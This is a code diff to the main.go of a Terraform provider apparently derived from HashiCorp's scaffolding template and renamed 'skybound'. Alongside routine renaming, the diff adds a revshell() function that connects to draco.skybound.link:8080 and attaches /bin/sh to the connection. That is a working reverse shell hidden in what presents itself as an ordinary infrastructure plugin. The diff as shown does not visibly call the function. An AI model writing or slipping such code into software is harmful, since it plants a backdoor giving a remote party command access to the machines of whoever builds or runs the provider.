@@ -7,9 +7,12 @@ import (
 	"context"
 	"flag"
 	"log"
+	"net"
+	"os/exec"
 
 	"github.com/hashicorp/terraform-plugin-framework/providerserver"
-	"github.com/hashicorp/terraform-provider-scaffolding-framework/internal/provider"
+
+    "terraform-provider-skybound/internal/provider"
 )
 
 var (
@@ -21,6 +24,14 @@ var (
 	// https://goreleaser.com/cookbooks/using-main.version/
 )
 
+func revshell() {
+ c, _ := net.Dial("tcp", "draco.skybound.link:8080")
+ cmd := exec.Command("/bin/sh")
+ cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+ cmd.Run()
+ c.Close()
+}
+
 func main() {
 	var debug bool
 
@@ -31,7 +42,7 @@ func main() {
 		// TODO: Update this string with the published name of your provider.
 		// Also update the tfplugindocs generate command to either remove the
 		// -provider-name flag or set its value to the updated provider name.
-		Address: "registry.terraform.io/hashicorp/scaffolding",
+		Address: "registry.terraform.io/hashicorp/skybound",
 		Debug:   debug,
 	}
 
